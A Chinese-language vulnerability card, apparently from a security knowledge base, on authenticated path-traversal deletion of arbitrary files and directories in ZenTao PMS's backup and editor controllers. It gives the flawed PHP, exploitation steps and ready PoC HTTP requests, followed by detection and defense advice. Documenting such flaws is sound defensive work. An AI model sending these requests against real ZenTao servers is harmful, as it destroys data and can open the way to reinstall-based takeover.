---
id: web-php-zentao-backup-editor-arbitrary-file-delete
title: 禅道后台 backup/editor 控制器路径穿越与任意路径删除
type: scenario
domain: web
path: web/php
technique: zentao-backup-editor-arbitrary-delete
aliases:
- 禅道任意文件删除
- 禅道任意目录删除
- backup.control delete 路径穿越
- editor.control delete base64
- ZenTao arbitrary delete
tags:
- php
- zentao
- arbitrary-file-delete
- path-traversal
- backup
- editor
- admin
cve: []
severity: medium
confidence: high
status: verified
affected_versions: 禅道 PMS 21.7.8（原文标题；实验截图环境为开源版 21.7.6）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V37
  verified_at: '2026-11-05T06:00:05+08:00'
  notes: 已对照原文核对：backup.control#delete 的 glob(backupPath+fileName*) 与 removeDir/unlink、editor.control#delete 的 safe64Decode+file_exists+unlink、turnon 前置和 Base64 PoC 均一致；删安装锁后组合 RCE 为原文未验证延伸，卡内未夸大；未在本机复现。
---

## 一句话结论

禅道后台 `backup.control#delete` 把请求参数 `fileName` 直接拼到备份目录后 `glob()`，再对匹配结果 `unlink` 或递归 `removeDir`，未限制路径穿越；`editor.control#delete` 则对 Base64 解码后的 `filePath` 直接 `file_exists` + `unlink`，可删除任意绝对路径文件。两者都需要后台权限，但可删除配置、安装锁、备份等任意文件/目录，造成数据破坏或为后续重装/提权铺路。

## 原理

- **backup.control#delete($fileName)**：
  ```php
  foreach(glob($this->backupPath . "{$fileName}*") as $backupFile) {
      if (is_dir($backupFile)) {
          $zfile = $this->app->loadClass('zfile');
          $zfile->removeDir($backupFile);
          ...
      } elseif (!unlink($backupFile)) { ... }
  }
  ```
  `$fileName` 未做 `basename`/路径归一化，直接与 `$this->backupPath` 拼接后交给 `glob`；`../` 可跳出备份目录，`*` 可匹配多个目标。目录走 `removeDir` 递归删除，文件走 `unlink`。
- **editor.control#delete($filePath)**：
  ```php
  $filePath = helper::safe64Decode($filePath);
  if (file_exists($filePath) and unlink($filePath)) return $this->send(...);
  ```
  先 Base64 解码，再直接判断存在并 `unlink`；没有目录拼接，也没有路径限制，传入绝对路径即可删除任意文件（只能删文件，不能删目录）。
- **前置**：`editor` 功能默认可能关闭，需先请求 `m=editor&f=turnon&status=1` 开启；`backup` 功能通常在后台上线，需有备份/管理权限。
- **危害**：删除 `install.php`/`install.lock` 可让安装程序重新出现，配合其他漏洞重装/写配置；删除配置文件可造成服务不可用；删除备份可破坏恢复能力。原文未进一步组合成 RCE，本卡按“任意文件/目录删除”原语记录。
- **权限**：两个入口都在后台控制器，需要有效管理员/相应权限会话；不是未授权漏洞。

## 触发条件

- 目标为禅道 PMS 受影响版本（原文 21.7.8；截图 21.7.6）。
- 攻击者拥有后台会话且可访问 `backup` / `editor` 模块，或通过其他后台入口获得相应权限。
- `backupPath` 与目标文件在同一文件系统/相对路径可达；`editor` 需要先开启功能。
- 目标进程对目标文件/目录有删除权限。

## 利用步骤

1. 登录后台，确认 `m=backup&f=delete` 与 `m=editor&f=turnon` 可达。
2. **backup 变体**：构造 `fileName=../../../../../target`（相对备份目录的路径），请求 `index.php?m=backup&f=delete&fileName=...`；`glob` 会匹配 `target*`，目录递归删除、文件 `unlink`。
3. **editor 变体**：先 `POST /zentao/index.php?m=editor&f=turnon&status=1` 开启功能；再把目标绝对路径 Base64 编码后放入 `filePath`，请求 `index.php?m=editor&f=delete&filePath=<base64>`。
4. 删除后验证目标不存在；评估是否影响安装锁、配置、备份等关键文件。
5. 清理：恢复被删文件/备份，检查是否被用于重装或进一步利用。

## PoC

backup 路径穿越删除（原文）：

```http
GET /zentao/index.php?m=backup&f=delete&fileName=../../../../../target HTTP/1.1
Host: localhost
Accept-Language: zh-CN,zh;q=0.9
X-Requested-With: XMLHttpRequest
Cookie: lang=zh-cn; vision=rnd; device=desktop; theme=default; zentaosid=<session>; hideMenu=false; tab=my
User-Agent: Mozilla/5.0
```

editor 开启功能：

```http
POST /zentao/index.php?m=editor&f=turnon&status=1 HTTP/1.1
Host: localhost
Cookie: zentaosid=<session>
X-Requested-With: XMLHttpRequest
Content-Length: 0
```

editor 删除任意文件（`filePath` 为绝对路径的 Base64）：

```http
GET /zentao/index.php?m=editor&f=delete&filePath=QzovdGFyZ2V0LnR4dA== HTTP/1.1
Host: localhost
Cookie: zentaosid=<session>
X-Requested-With: XMLHttpRequest
```

`QzovdGFyZ2V0LnR4dA==` 解码为 `C:/target.txt`。

## 变体与关联

- **backup glob 通配**：`fileName` 可含 `*`/`?` 扩大匹配范围；不同平台的路径分隔符与备份目录层级需调整 `../` 数量。
- **editor 绝对路径**：Windows 用 `C:/...`，Linux 用 `/...`；只能删文件，目录删除走 backup 的 `removeDir`。
- **权限差异**：backup 可能需要备份管理权限，editor 需要先开启功能；若目标有越权/弱口令，可先获取后台会话。
- **后续利用**：删除安装锁/配置后结合安装程序或配置重写可能升级为 RCE，但原文未验证，本卡不将其作为已证实链路。
- 关联卡片：[[web-generic-ssrf-zentao-webhook-file-protocol-arbitrary-read]]（同版本后台文件读取）。

## 检测与防御

- **代码**：`fileName` 只允许 `basename` 并校验 `realpath` 位于备份目录；禁止 `..`/通配符；`editor` 的 `filePath` 应基于白名单目录 + 文件名，不直接 `unlink` 任意路径。
- **权限**：收紧 backup/editor 模块权限，后台强制强口令/MFA；生产环境禁用不需要的编辑器功能。
- **检测**：`m=backup&f=delete` 的 `fileName` 含 `../`、`*`；`m=editor&f=turnon` 后紧接 `m=editor&f=delete` 且 `filePath` 为绝对路径 Base64；关键文件（安装锁、配置、备份）消失；后台删除操作日志与文件系统时间线。
- **应急**：从备份恢复被删文件，检查安装锁/配置是否被重置；轮换可能泄露的凭据；升级修复版本并审计后台账号。
